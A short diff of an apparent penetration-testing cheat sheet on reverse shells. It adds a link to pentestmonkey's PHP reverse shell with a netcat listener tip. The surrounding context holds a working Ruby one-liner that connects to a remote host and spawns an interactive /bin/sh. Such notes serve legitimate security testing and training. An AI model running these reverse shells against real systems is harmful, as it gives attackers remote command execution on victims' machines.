@@ -38,6 +38,8 @@ https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 - https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 	> Config listerner as nc -lvnp [port]
 
+- https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+	> Config listerner as nc -lvnp [port]
 
 # Ruby
 - ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
